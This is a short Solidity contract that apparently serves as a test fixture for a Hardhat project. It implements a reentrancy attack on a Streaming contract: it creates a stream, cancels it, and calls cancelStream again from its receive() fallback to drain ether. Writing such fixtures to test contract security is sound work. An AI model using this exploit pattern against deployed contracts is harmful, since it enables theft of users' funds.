// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Streaming.sol";
import "hardhat/console.sol";

contract CancelReentrancyAttack {
    Streaming streaming;
    address sender;
    address recipient;
    uint256 myStreamId;


    receive() external payable {
        if (address(streaming).balance >= 1 ether) {
            streaming.cancelStream(myStreamId);
        }
    }

    function attackStreaming(address payable _streamingAddress) external payable {
        streaming = Streaming(_streamingAddress);
        sender = address(this);
        recipient = address(msg.sender);
        uint256 val = msg.value;
        uint256 startTime = block.timestamp;
        myStreamId = streaming.createStream{value: val}(recipient, val, startTime, startTime + 1);
        streaming.cancelStream(myStreamId);
        
    }
}